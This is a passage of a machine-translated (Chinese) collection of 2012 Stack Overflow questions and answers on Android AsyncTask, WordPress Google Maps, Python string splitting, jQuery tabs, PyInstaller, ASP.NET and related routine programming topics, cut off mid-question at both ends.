RewriteRule ^/auth/(.+)$ /?p=auth&action=$1 [L] 
```

甚至性能稍好：

```
RewriteEngine On
RewriteRule ^/auth/(.+)$ /index.php?p=auth&action=$1 [L] 
```

（我假设您将文件`index.php`用作路由器，也可能是其他任何语言或解决方案。）

# android - Android：无法在 Asynctask 中的 OnPostExecute 方法中获取 doInBackground 结果

> ID：13429893
> 
> 赞同：2
> 
> 时间：2012-11-17T10:59:41.160
> 
> 标签：android, android-asynctask

我有一个 Asynctask 的问题，我无法在 OnPostExecute 中获取 doInBackground 方法的返回值，你能帮帮我吗？

我将Asynctask的返回值设置为Integer，而我返回的值是一个int，那么为什么应用程序在doInBackground返回时停止？

如果你能向我解释 Asynctask 是如何工作的，我将非常感激。

非常感谢你！！

```
public class LoginActivity extends Activity 
{
ProgressDialog pDialog;
JSONParser jParser = new JSONParser();

Button btnLogin;
Button btnLinkToRegister;
EditText inputEmail;
EditText inputPassword;
TextView loginErrorMsg;

JSONArray user = null;
ArrayList<HashMap<String, String>> userList;

private static String loginURL = "htttp://example.com/query.php";

private static String KEY_SUCCESS = "success";
private static String KEY_EMAIL = "email";
private static String KEY_PASSWORD = "password";

@Override
public void onCreate(Bundle savedInstanceState) 
{    
    super.onCreate(savedInstanceState);
    setContentView(R.layout.login);

    userList = new ArrayList<HashMap<String, String>>();

    inputEmail = (EditText) findViewById(R.id.loginEmail);
    inputPassword = (EditText) findViewById(R.id.loginPassword);
    btnLogin = (Button) findViewById(R.id.btnLogin);
    btnLinkToRegister = (Button) findViewById(R.id.btnLinkToRegisterScreen);

    btnLogin.setOnClickListener(new View.OnClickListener() 
    {   
        @Override
        public void onClick(View v) 
        {
            new CheckUser().execute();          
        }
    });

}

/**
 * Background Async Task to Load all product by making HTTP Request
 * */

class CheckUser extends AsyncTask<String, String, Integer> 
{
    /**
     * Before starting background thread Show Progress Dialog
     * */
    @Override
    protected void onPreExecute() 
    {
        super.onPreExecute();
        pDialog = new ProgressDialog(LoginActivity.this);
        pDialog.setMessage("Verifica dati inseriti...");
        pDialog.setIndeterminate(false);
        pDialog.setCancelable(false);
        pDialog.show();
    }

    protected Integer doInBackground(String... args)
    {
        int valoreOnPostExecute = 0;

        String emailInserted = inputEmail.getText().toString();
        // Building Parameters
        List<NameValuePair> params = new ArrayList<NameValuePair>();
        params.add(new BasicNameValuePair("email", emailInserted));
        // getting JSON string from URL
        JSONObject json = null;

        json = jParser.getJSONFromUrl(loginURL, params);

        // Check your log cat for JSON response
        Log.d("All Users: ", json.toString());

        try 
        {
            // Checking for SUCCESS TAG
            int success = json.getInt(KEY_SUCCESS);

            if (success == 1) 
            {
                // users found
                // Getting Array of users
                user = json.getJSONArray("utenti");

                // looping through All users
                for (int i = 0; i < user.length(); i++) 
                {
                    JSONObject c = user.getJSONObject(i);

                    // Storing each json item in variable
                    String email = c.getString(KEY_EMAIL);
                    String password = c.getString(KEY_PASSWORD);

                    // creating new HashMap
                    HashMap<String, String> map = new HashMap<String, String>();

                    // adding each child node to HashMap key => value
                    map.put(KEY_EMAIL, email);
                    map.put(KEY_PASSWORD, password);

                    // adding HashList to ArrayList
                    userList.add(map);
                }

//                    Intent intent = new Intent(LoginActivity.this,GenereMusicale.class);
//                    startActivity(intent);
                    valoreOnPostExecute = success;
                } 
//                else 
//                {
//                  Log.d("success != 1", json.toString());
//                  //Toast.makeText(LoginActivity.this, "Username/password non corretti", Toast.LENGTH_SHORT).show();
//                }
        }
        catch (JSONException e) 
        {
            e.printStackTrace();
            Log.d("User ARRAY", "user array: "+user);
        }

        return valoreOnPostExecute;
    }

    /**
     * After completing background task Dismiss the progress dialog
     * **/
    protected void onPostExecute(int valoreOnPostExecute) 
    {
        // dismiss the dialog after getting all products
        pDialog.dismiss();
        // updating UI from Background Thread

        if(valoreOnPostExecute == 1)
        {
            Intent intent = new Intent(LoginActivity.this,GenereMusicale.class);
            startActivity(intent);
        }
        else
        {
            new AlertDialog.Builder(LoginActivity.this)
            .setTitle("Fine del Round!")
            //.setMessage("Terminare round?")
            //.setNegativeButton(android.R.string.no, null)
            .setPositiveButton(android.R.string.ok, new OnClickListener() {

                public void onClick(DialogInterface arg0, int arg1) {
                    finish();
                }
            }).create().show();
        }
    }

}

} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-17T11:09:47.687

您的返回类型`doInBackground()`和接收类型`onPostExecute()`不匹配

试试这样

```
class CheckUser extends AsyncTask<String, String, Integer> 

protected Integer doInBackground(String... args)

protected void onPostExecute(Integer valoreOnPostExecute) 
```

# javascript - 如何在body标签中初始化谷歌地图？

> ID：13429895
> 
> 赞同：3
> 
> 时间：2012-11-17T11:00:02.780
> 
> 标签：javascript, wordpress, google-maps, google-maps-api-3

我正在我的一个页面中实施谷歌地图。我知道我需要`onload="initialize()" onunload="GUnload()"`在`<body>`标签中添加，但我不确定如何。

目前在我的页面中，我粘贴了以下内容：

```
<body onload="initialize()" onunload="GUnload()">
  <p>To Add your Google Map you must first plot your address by searching</p>
  <p>
    <input id="address" type="textbox" value="" placeholder="Search For Your Address">
    <input type="button" value="Plot Your Address" onclick="codeAddress()">
  </p>
  <div id="map_canvas" style="width: 770px; height: 270px; border: 5px solid #EDEDED">
  </div>
</body> 
```

尽管这确实有效，但它必须是可怕的标记，因为它是主页正文部分中的正文部分。

我正在使用 Wordpress，但我不确定上面的标记是否正常，或者我是否应该将它放在主页正文标记中。问题是如果需要，我不确定如何执行此操作。由于我只需要在一个页面上而不是在整个站点上使用它，因此我不想将其添加到站点的正文标记中以在每个页面上初始化 Google 地图并减慢站点速度。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:17:37.433

不，您不想将另一个正文标签添加到使用地图的特定页面模板中。您的开始`<body>`标签将在 中`header.php`，您应该获取要加载并执行的特定页面的页面 ID；

```
<body <?php if (is_page(374)) { echo 'onload="initialize()" onunload="GUnload()"'; } ?>> 
```

在`header.php`

它将将该代码添加到（在我的实例中）第 374 页。

要查找页面 ID，只需将鼠标悬停在后端的“页面”部分中，您就可以在链接 url 中看到该 ID。

对于您将使用的多个页面；

```
<body <?php if (is_page(array(374,375))) { echo 'onload="initialize()" onunload="GUnload()"'; } ?>> 
```

并且您也可以使用 slug 或标题而不是 ID，但当然它们很容易让您的客户更改和停止该代码的工作。这是 is_page 上的 codex 链接；

[http://codex.wordpress.org/Function_Reference/is_page](http://codex.wordpress.org/Function_Reference/is_page)

# python - Python 2.7 中的分割线

> ID：13429900
> 
> 赞同：0
> 
> 时间：2012-11-17T11:00:34.183
> 
> 标签：python, split, python-2.x

我想用 Python 分割线，`W03*17*65.68*KG*0.2891*CR*1*1N`然后将 Value qty 捕获为 17 Value kg as 65,68

尝试拆分

```
myarray = Split(strSearchString, "*")
a = myarray(0)
b = myarray(1) 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-17T11:04:34.717

[`split`](http://docs.python.org/3/library/stdtypes.html#str.split)是字符串本身的方法，您可以使用 访问列表的元素`[42]`，而不是方法调用`(42)`[^(doc)](http://docs.python.org/3/tutorial/introduction.html#lists)。尝试：

```
s = 'W03*17*65.68*KG*0.2891*CR*1*1N'
lst = s.split('*')
qty = lst[1]
weight = lst[2]
weight_unit = lst[3] 
```

您可能还对元组解包感兴趣：

```
s = 'W03*17*65.68*KG*0.2891*CR*1*1N'
_,qty,weight,weight_unit,_,_,_,_ = s.split('*') 
```

你甚至可以使用[切片](http://docs.python.org/3/tutorial/introduction.html#strings)：

```
s = 'W03*17*65.68*KG*0.2891*CR*1*1N'
qty,weight,weight_unit = s.split('*')[1:4] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-17T11:04:18.857

```
>>> s = "W03*17*65.68*KG*0.2891*CR*1*1N"
>>> lst = s.split("*")
>>> lst[1]
'17'
>>> lst[2]
'65.68' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-17T11:03:31.433

您需要`split`在某个字符串上调用方法来拆分它。仅仅使用`Split(my_str, "x")`是行不通的：-

```
>>> my_str = "Python W03*17*65.68*KG*0.2891*CR*1*1N"
>>> tokens = my_str.split('*')
>>> tokens
['Python W03', '17', '65.68', 'KG', '0.2891', 'CR', '1', '1N']
>>> tokens[1]
'17'
>>> tokens[2]
'65.68' 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-17T08:23:08.793

If you'd like to capture Value qty as 17 Value kg as 65.68, one way to solve it is using dictionary after splitting strings.

```
>>> s = 'W03*17*65.68*KG*0.2891*CR*1*1N'
>>> s.split('*')
['W03', '17', '65.68', 'KG', '0.2891', 'CR', '1', '1N']
>>> t = s.split('*')
>>> dict(qty=t[1],kg=t[2])
{'kg': '65.68', 'qty': '17'} 
```

Hope it helps.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-09-17T08:17:15.840

```
 >>>s ="W03*17*65.68*KG*0.2891*CR*1*1N"

 >>>my_string=s.split("*")[1] 

>>> my_string
   '17'

>>> my_string=s.split("*")[2] 

>>> my_string
 '65' 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-17T11:05:47.903

```
import string
myarray = string.split(strSearchString, "*")
qty = myarray[1]
kb = myarray[2] 
```

# php - 带有 jquery 的选项卡（默认选项卡）

> ID：13429902
> 
> 赞同：0
> 
> 时间：2012-11-17T11:00:42.907
> 
> 标签：php, javascript, jquery, jquery-ui, codeigniter

我为标签使用了一个简单的 jquery 代码，它的想法是：在每个标签中我都有一个表单，当我提交每个表单时，代码会给我来自 mysql 的值。问题是，当我在例如选项卡 3 中提交表单时，它会在我显示任何结果之前将我重定向到第一个选项卡（默认选项卡）。任何解决此问题的建议。在此先感谢，我的代码：

```
 <script type="text/javascript">
 $(function() {
 $( "#tabs" ).tabs();
   });
</script> 
```

HTML 代码：

```
<div id="tabs">
    <ul>
        <li><a href="#tabs-1">tab 1</a></li>
        <li><a href="#tabs-2">tab 2</a></li>
        <li><a href="#tabs-3">tab 3</a></li>
    </ul>
    <div id="tabs-1">
         <p>tab 1 content</p>
    </div>
    <div id="tabs-2">
         <p>tab 2 content</p>
    </div>
    <div id="tabs-3">
         <p>tab 3 content</p>
    </div>

</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-29T16:53:44.250

如果您使用 php，您可以在包含选项卡编号的表单中使用隐藏的 html 字段。提交表单时，您可以解析该变量并在 jQuery 代码中使用它。如果您在 jQuery 代码中使用 php，则可能如下所示：

```
$("#tabs").tabs({ 
    selected: <?php echo (isset($_POST['selected_tab']) ? $_POST['selected_tab'] : 1)?> 
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:59:04.033

您说“表单”，如果您提交表单，页面将发送数据并自行刷新。只需使用一个按钮，当单击该按钮时，发送 ajax。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T11:04:07.890

你开玩笑地使用这个代码

```
$( ".selector" ).tabs( "load", 2 ); 
```

加载后调用此选项，以便您可以选择 2 个选项卡。试试看！！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T11:22:41.963

您可以将参数传递给 tabs() 函数 (http://api.jqueryui.com/tabs/)

```
 <script type="text/javascript">
 $(function() {
     $( "#tabs" ).tabs({active: 2});
 });
 </script> 
```

# asp.net - 将 dll 从 Bin 移动到 GAC

> ID：13429907
> 
> 赞同：0
> 
> 时间：2012-11-17T11:01:33.997
> 
> 标签：asp.net, gac, bin

当我们将 dll 从 BIN 文件夹移动到 GAC 时会出现什么问题？

1.  我的配置中是否需要进行任何修改？

2.  如果应用程序仍在运行，那么如果没有 issreset，它会继续使用旧的 dll 吗？

3.  我可以在两个地方都有 dll 吗？在斌和广汽。如果是这样，哪一个会被推荐？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T14:38:09.920

根据您的需要，Web.Config 更改是可选的。您可以在这两个地方都有 DLL。运行时首先查看 GAC，然后查看应用程序的探测路径，其中包括用于加载程序集的 bin：

[从 GAC 或 Bin 加载 ASP.net 程序集](http://blogs.msdn.com/b/pranav_rastogi/archive/2010/10/18/asp-net-assembly-loading-from-gac-or-bin.aspx)

[bin 和 gac 中的 dll，使用哪个？](https://stackoverflow.com/questions/981142/dll-in-both-the-bin-and-the-gac-which-one-gets-used)

您可以重新启动应用程序池并保持其余应用程序池不变。没有 IIS 服务停止或启动：

[在没有 IISReset 的情况下重新加载 Web 程序集的最佳方法](https://stackoverflow.com/questions/744990/best-way-to-reload-web-assemblies-without-iisreset)

# java - 如何通过从微调器中选择来启用 wifi

> ID：13429908
> 
> 赞同：1
> 
> 时间：2012-11-17T11:01:40.627
> 
> 标签：java, android, android-intent

```
 WIFI  = (Spinner) findViewById(R.id.WIFI);
 // Create an ArrayAdapter using the string array and a default spinner layout
 ArrayAdapter<CharSequence> adapter = ArrayAdapter.createFromResource(this,
         R.array.WIFI, android.R.layout.simple_dropdown_item_1line);
 // Specify the layout to use when the list of choices appears
 adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
 // Apply the adapter to the spinner
 WIFI.setAdapter(adapter);
 WIFI.setOnItemSelectedListener(new MyOnItemSelectedListener()); 
```

如何通过从微调器中选择来启用**wifi**。我会感谢你的

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T11:04:33.957

将这段代码添加到您的侦听器

```
WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
wifi.setWifiEnabled(true); 
```

或用于切换行为

```
wifi.setWifiEnabled(!wifi.isWifiEnabled()); 
```

您可能需要为清单添加一些权限

```
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" /> 
```

有关更多选项，请参阅[WifiManager](http://developer.android.com/reference/android/net/wifi/WifiManager.html) ...

据我所知，没有针对热点功能的 API。您将不得不使用反射来调用这些方法......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:05:22.223

为此，您需要获取微调器的文本（或选择），然后您需要切换 WiFi 设置。

在微调器上获取所选项目

*   [获取微调器选定项目文本？](https://stackoverflow.com/questions/5787809/get-spinner-selected-items-text)

    ```
    String Text = mySpinner.getSelectedItem().toString();
    if (Text.equals("on"){
        //put below code here
    } else {
        //put more code here
    } 
    ```

切换 WiFi

*   [Android：如何以编程方式启用/禁用 Wifi 或 Internet 连接](https://stackoverflow.com/questions/3930990/android-how-to-enable-disable-wifi-or-internet-connection-programmatically)

    ```
    WifiManager wifiManager = (WifiManager)this.context.getSystemService(Context.WIFI_SERVICE);
    wifiManager.setWifiEnabled(true); 
    ```

# javascript - 如何在没有任何库的情况下使用 jquery swipe？

> ID：13429913
> 
> 赞同：7
> 
> 时间：2012-11-17T11:02:17.907
> 
> 标签：javascript, jquery, jquery-mobile, swipe, swipe-gesture

我需要`$("#slider ul li div").swipeleft();`使用核心 jQuery 创建 jQuery mobile 之类的 Swipe 手势，而不使用任何库或插件，甚至不使用 jQuery mobile。

我知道 jQuery 移动小部件现在将被解耦，这样我们就可以单独从中进行滑动。但我不能等那么久。

我需要一些类似于左右滑动功能的滑动手势的手动 jQuery 代码。我见过[这个](http://www.zackgrossbart.com/hackito/touchslider/)，但我不明白如何从中获得滑动手势。任何人都可以帮我解决该代码吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-27T10:47:28.997

这是使用 javascript 进行触摸滑动的代码。最后，我在互联网上搜索了一下，发现很难。感谢[padilicious](http://padilicious.com/)。下面是滑块的 HTML 代码。

```
<div id="slider" ontouchstart="touchStart(event,'slider');" ontouchend="touchEnd(event);" 
ontouchmove="touchMove(event);" ontouchcancel="touchCancel(event);">
<ul id="slideul"><li><img src="1.jpg"></li><li>....</ul>
</div> 
```

下面是触摸滑动的 javascript 代码。它有点长。但它对我有用。你不必改变任何东西。唯一需要更改的地方是**processingRoutine(** ) 函数。我使用此代码`sliders.goToNext()`&调用了 2 个幻灯片功能，即上一个和下一个`sliders.goToPrev()`。你可以随意修改..

```
var triggerElementID = null; // this variable is used to identity the triggering element
var fingerCount = 0;
var startX = 0;
var startY = 0;
var curX = 0;
var curY = 0;
var deltaX = 0;
var deltaY = 0;
var horzDiff = 0;
var vertDiff = 0;
var minLength = 72; // the shortest distance the user may swipe
var swipeLength = 0;
var swipeAngle = null;
var swipeDirection = null;

// The 4 Touch Event Handlers

// NOTE: the touchStart handler should also receive the ID of the triggering element
// make sure its ID is passed in the event call placed in the element declaration, like:
// <div id="picture-frame" ontouchstart="touchStart(event,'picture-frame');"  ontouchend="touchEnd(event);" ontouchmove="touchMove(event);" ontouchcancel="touchCancel(event);">

function touchStart(event,passedName) {
    // disable the standard ability to select the touched object
    event.preventDefault();
    // get the total number of fingers touching the screen
    fingerCount = event.touches.length;
    // since we're looking for a swipe (single finger) and not a gesture (multiple fingers),
    // check that only one finger was used
    if ( fingerCount == 1 ) {
        // get the coordinates of the touch
        startX = event.touches[0].pageX;
        startY = event.touches[0].pageY;
        // store the triggering element ID
        triggerElementID = passedName;
    } else {
        // more than one finger touched so cancel
        touchCancel(event);
    }
}

function touchMove(event) {
    event.preventDefault();
    if ( event.touches.length == 1 ) {
        curX = event.touches[0].pageX;
        curY = event.touches[0].pageY;
    } else {
        touchCancel(event);
    }
}

function touchEnd(event) {
    event.preventDefault();
    // check to see if more than one finger was used and that there is an ending coordinate
    if ( fingerCount == 1 && curX != 0 ) {
        // use the Distance Formula to determine the length of the swipe
        swipeLength = Math.round(Math.sqrt(Math.pow(curX - startX,2) + Math.pow(curY - startY,2)));
        // if the user swiped more than the minimum length, perform the appropriate action
        if ( swipeLength >= minLength ) {
            caluculateAngle();
            determineSwipeDirection();
            processingRoutine();
            touchCancel(event); // reset the variables
        } else {
            touchCancel(event);
        }   
    } else {
        touchCancel(event);
    }
}

function touchCancel(event) {
    // reset the variables back to default values
    fingerCount = 0;
    startX = 0;
    startY = 0;
    curX = 0;
    curY = 0;
    deltaX = 0;
    deltaY = 0;
    horzDiff = 0;
    vertDiff = 0;
    swipeLength = 0;
    swipeAngle = null;
    swipeDirection = null;
    triggerElementID = null;
}

function caluculateAngle() {
    var X = startX-curX;
    var Y = curY-startY;
    var Z = Math.round(Math.sqrt(Math.pow(X,2)+Math.pow(Y,2))); //the distance - rounded - in pixels
    var r = Math.atan2(Y,X); //angle in radians (Cartesian system)
    swipeAngle = Math.round(r*180/Math.PI); //angle in degrees
    if ( swipeAngle < 0 ) { swipeAngle =  360 - Math.abs(swipeAngle); }
}

function determineSwipeDirection() {

    if ( (swipeAngle <= 45) && (swipeAngle >= 0) ) {
        swipeDirection = 'left';
    } else if ( (swipeAngle <= 360) && (swipeAngle >= 315) ) {
        swipeDirection = 'left';
    } else if ( (swipeAngle >= 135) && (swipeAngle <= 225) ) {
        swipeDirection = 'right';
    } else if ( (swipeAngle > 45) && (swipeAngle < 135) ) {
        swipeDirection = 'down';
    } else {
        swipeDirection = 'up';
    }
}

function processingRoutine() {
    var swipedElement = document.getElementById(triggerElementID);
    if ( swipeDirection == 'left' ) {
        sliders.goToNext();         
    } else if ( swipeDirection == 'right' ) {
        sliders.goToPrev();
    } else if ( swipeDirection == 'up' ) {
        sliders.goToPrev();         
    } else if ( swipeDirection == 'down' ) {
        sliders.goToNext();         
    }
} 
```

# iphone - 基于选项卡的应用程序显示视图而不显示选项卡视图？

> ID：13429917
> 
> 赞同：-1
> 
> 时间：2012-11-17T11:02:38.440
> 
> 标签：iphone, objective-c, ios5

我希望我的应用程序启动第一个带有选项卡的主视图：信息、通知、朋友、选项，但主视图不是任何选项卡的一部分……见下图……。

homeview 有标签，但没有选择标签：

![homeview 有标签，但没有选择标签](../Images/8f05a70e3d6431f225b74e809717caeb.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:28:46.813

您可以创建一个`UIView`并`didLoad`添加 `sub-view`到您的视图中，并在任何`tab`单击时将其从`super-view`. 或者您可以更改第一个标签的视图并在按下任何标签时将其删除。

```
-(void)staySafe_meathod
{
  UIView *temp_one = [[UIView alloc] initWithFrame:CGRectMake(0,0,120,120)];
  [self.view addsubView:temp_one];//or the tab view u set it default show when the app open.

} 
```

然后你在 didLoad 中称这个肉食

# c# - 为什么我不能从 ObservableCollection 中删除项目？

> ID：13429918
> 
> 赞同：1
> 
> 时间：2012-11-17T11:02:47.500
> 
> 标签：c#, .net, wpf

我填写了一些`ObservableCollection<Employe>`收藏：

```
// Program.Data.Employees - it is ObservableCollection<Employe>.
Program.Data.Employees.Add(new Employe() { Name="Roman", Patronymic="Petrovich", Surname="Ivanov" });
Program.Data.Employees.Add(new Employe() { Name = "Oleg", Patronymic = "Vladimirovich", Surname = "Trofimov" });
Program.Data.Employees.Add(new Employe() { Name = "Anton", Patronymic = "Igorevich", Surname = "Kuznetcov" }); 
```

在我的代码的其他地方，我尝试从这个集合中删除一些项目：

```
// Program.Data.Employees - it is ObservableCollection<Employe>.
Employe x = Program.Data.Employees.First(n => n.Guid == emp.Guid); // x is not null.
Int32 index = Program.Data.Employees.IndexOf(x); // I got -1\. Why?
Boolean result = Program.Data.Employees.Remove(x); // I got 'false', and item is not removed. Why?
// But this works fine:
Program.Data.Employees.Clear(); 
```

我可以清除收藏，但我不能删除必要的项目。为什么会发生？

# UPD：`Equals`我`Employe`班级的方法

```
public bool Equals(Employe other) {
    return
    other.Guid == this.Guid &&
    String.Equals(other.Name, this.Name, StringComparison.CurrentCultureIgnoreCase) &&
    String.Equals(other.Patronymic == this.Patronymic, StringComparison.CurrentCultureIgnoreCase) &&
    String.Equals(other.Surname == this.Surname, StringComparison.CurrentCultureIgnoreCase) &&
    other.Sex == this.Sex &&
    String.Equals(other.Post == this.Post, StringComparison.CurrentCultureIgnoreCase);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T11:48:46.350

我尝试了以下代码来重现您的错误：

```
class Employee
{
  public string Name { get; set; }
  public Guid Guid { get; set; }
}

// ...
ObservableCollection<Employee> employees = new ObservableCollection<Employee>();
var guid1 = Guid.NewGuid();
employees.Add(new Employee { Name = "Roman", Guid = guid1 });
employees.Add(new Employee { Name = "Oleg", Guid = Guid.NewGuid() });

var x = employees.First(e => e.Guid == guid1);
var index = employees.IndexOf(x); // index = 0, as expected
var result = employees.Remove(x); // result = true, as expected 
```

它按预期工作。我建议，你设置一个断点`var x = ...`并检查，如果

*   该集合确实包含您正在查找的项目
*   如果`First()`真的返回该项目

然后转到下一行并检查是否`index`正确返回。最后再次检查，如果`result`真的是假的。

我看到您的代码失败的几个可能原因：

*   您没有发布完整的代码，并且在`x=Program.Data.Employees.First()`和之间发生了一些事情`Program.Data.Employees.IndexOf()`
*   您使用多线程代码（这也会导致两个语句之间发生“某些事情”）。这种情况下，需要同步对集合的访问
*   您不`ObservableCollection`直接使用由数据层构造的派生类，而是使用一些派生类（例如`DataServiceCollection`，但这个也应该可以正常工作）。在这种情况下，请在调试器中检查您的集合的实际类型

另一个导致集合错误的典型原因是，如果您尝试在迭代集合时删除项目（即在`foreach`循环内）：但在这种情况下，应该抛出异常（并且`IndexOf`应该可以正常工作），所以这只适用于您使用一些实现非标准行为的派生类。

**编辑** *（作为回报您发布您的`Equal`方法）*

您的`Equal`方法存在严重错误：

```
String.Equals(other.Patronymic == this.Patronymic, StringComparison.CurrentCultureIgnoreCase)
... // applies also for following comparisons 
```

应该

```
String.Equals(other.Patronymic, this.Patronymic, StringComparison.CurrentCultureIgnoreCase)
... 
```

此外，如果您使用的是 Guid，请考虑仅比较 GUID，因为这通常意味着“唯一标识符”，因此它应该足以识别某些实体。

# python - PyInstaller 打包的应用程序在控制台模式下工作正常，在窗口模式下崩溃

> ID：13429924
> 
> 赞同：7
> 
> 时间：2012-11-17T11:03:34.100
> 
> 标签：python, qt, pyqt, pyside, pyinstaller

我正在使用 Python 和 PySide 构建一个相当复杂的应用程序。终于发布的日子快到了，所以我想将此应用程序构建为 exe。

但是，我手上有一个奇怪的问题。我过去使用过 PyInstaller（顺便说一下使用版本 2），但从来没有发生过这种情况。

基本上，当我使用`--console`标志构建应用程序时，它工作正常 - 但它会打开控制台窗口。当我使用窗口标志 ( `-w`) 构建应用程序时，它不能正常工作。它开始了一切，但有所有这些奇怪的故障。例如，加载文本文件通常会引发`BadFileDescriptor`错误（在控制台模式下不会发生），并且应用程序在执行特定任务后会崩溃。更糟糕的是，任务是一个循环，第一次执行的很好，但是当它再次开始工作时，它就崩溃了。

当我查看 minidump 文件时，有一些关于 QtGui4.dll 文件的内存访问冲突的错误。同样，这不会在控制台模式下发生。

有人有想法么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-17T12:49:27.280

错误和因此的内存访问冲突是由窗口模式下的应用程序是一个固定大小的缓冲区`BadFileDescriptor`这一事实引起的。因此，如果您正在使用或直接`stdout`写入，一段时间后您会看到这些错误。`stdout``print``sys.stdout`

您可以通过以下方式解决此问题：

1.  删除/注释掉关于`stdout`
2.  使用`logging`而不是打印到标准输出
3.  `stdout`在应用程序执行开始时重定向。这是需要更改的代码更少的解决方案，即使我认为将调试语句移至`logging`将是更好的选择。

要重定向`stdout`，您可以使用这种代码：

```
import sys
import tempfile
sys.stdout = tempfile.TemporaryFile()
sys.stderr = tempfile.TemporaryFile() 
```

就在执行你的程序之前。您还可以使用一些自定义对象将输出放入“日志”文件或其他文件中，重要的是输出不应填充固定大小的缓冲区。

例如，您可以执行类似这样的操作，以便能够在`logging`不更改太多代码的情况下利用该模块：

```
import sys
import logging

debug_logger = logging.getLogger('debug')
debug_logger.write = debug_logger.debug    #consider all prints as debug information
debug_logger.flush = lambda: None   # this may be called when printing
#debug_logger.setLevel(logging.DEBUG)      #activate debug logger output
sys.stdout = debug_logger 
```

这种方法的缺点是对每一行`print`执行更多的调用：`stdout.write`

```
>>> print 'test'
DEBUG:debug:test
DEBUG:debug: 
```

如果您愿意，您可能可以避免这种行为，编写一个仅使用“完整行”`write`调用的真实函数。`the_logger.debug`

无论如何，我认为这种解决方案应该只是暂时的，并且只能在将`print`s 移植到调用`logging.debug`.

（显然，记录器应该写入文件而不是`stdout`为了避免错误。）

# css - 即使在外部编辑器中编辑，Chrome 也会即时应用用户样式（custom.css），我如何将这种机制用于 webdev？

> ID：13429928
> 
> 赞同：1
> 
> 时间：2012-11-17T11:03:49.757
> 
> 标签：css, google-chrome, customization

因此 chrome 会自动更新对`C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\User StyleSheets\Custom.css`. 这很棒，因为我可以选择我最喜欢的编辑器并将我从任何集成浏览器的 css 操作工具中解放出来。

但它仅适用于该特定文件。我知道即使我在`localhost`服务器上工作，它也不能直接用于编辑服务器端 css。但是有没有其他方法可以使用这种甜蜜的机制，也许手动告诉 chrome 查找特定的 css 文件并将其用作替代`Custom.css`？

编辑：我认为导入也不起作用..这些规则似乎都没有任何效果

```
@import "stylish.1misc.css";            //in the same dir as Custom.css
@import url("stylish.1misc.css");
@import url("http://localhost/.my/stylish.2img.css");
@import url("file:///D:/.localhost/.my/stylish.1misc.css"); 
```

[有关的](https://stackoverflow.com/questions/13482157/why-cant-i-import-from-chromes-userstylesheet-custom-css)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T03:02:47.270

您可以使用[Chrome 开发者工具](https://developers.google.com/chrome-developer-tools/)来做[这件事](https://developers.google.com/chrome-developer-tools/docs/resources)和其他几件事。也喜欢编辑和[热交换](http://en.wikipedia.org/wiki/Hot_swapping)Javascript。

通过在 google 或 youtube 上进行快速搜索，您可以找到大量[示例。](http://www.youtube.com/watch?v=nOEw9iiopwI)

这是一个在流行站点上热交换某些 CSS 的示例，使之`font-size`变得更大。

![Me gustan las tortugas](../Images/712c1e0770b61f54e38eed34f260a706.png)

这些更改可以保存在本地（我想是缓存文件夹），或者您可以选择将它们保存在其他地方。

但是，更改不是持久的，刷新页面会导致所有更改丢失，但如果您想让这些更改永久用于您不拥有的网站，您可以将这些更改粘贴到 Chrome 用户样式表；或者您自己的项目，您可以在本地保存更改。对于最后一种情况，上面提供的链接有很多好的做法和建议。

# nsis - Nsis Zip2Exe 遗漏了命名文件夹的日志

> ID：13429930
> 
> 赞同：0
> 
> 时间：2012-11-17T11:03:59.960
> 
> 标签：nsis

我是 Nsis 的新手，如果我的问题很容易解决，请原谅我。

我想从我刚压缩的 Xampp 文件夹中制作一个 exe（它是一个网络服务器软件）。当我用总指挥官压缩这个时，每个文件夹都在正确的位置。但是当我运行 Zip2Exensis 应用程序时，即使它们不为空，我的“日志”命名文件夹也不会压缩到 exe 中。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T14:12:19.610

解决方案：

我不得不撤销文件夹的只读权限

# c# - 图表多个系列不同长度生成重复的x轴

> ID：13429934
> 
> 赞同：0
> 
> 时间：2012-11-17T11:04:25.550
> 
> 标签：c#, asp.net, charts

从我的 Web 应用程序 ASP.NET 4.0 看这张图片。 ![在此处输入图像描述](../Images/b456a25a0f096bed0e78c70c5e4b753f.png)

正如你可以看到的线有不同的长度。还有重复的 x 轴条目。

蓝色系列缺少数据点，黄色则没有。问题 1：如何对齐它们以使 x 轴保持不变。目前我正在这样做。并使线条同样长？问题 2：有没有一种方法可以使图表具有交互性，以便您可以使用 ASP.NET 将光标悬停在线上查看该点的数据？

```
int amountofrows = Convert.ToInt32(dt.Rows[0]["antal"].ToString());

for (int i = 0; i < amountofrows; i++)
{
    List<string> xvals = new List<string>();
    List<decimal> yvals = new List<decimal>();
    string serieName = dt.Rows[i]["doman_namn"].ToString();
    Chart1.Series.Add(serieName);
    Chart1.Series[i].ChartType = SeriesChartType.Line;

    foreach (DataRow dr in dt.Rows)
    {
        try
        {
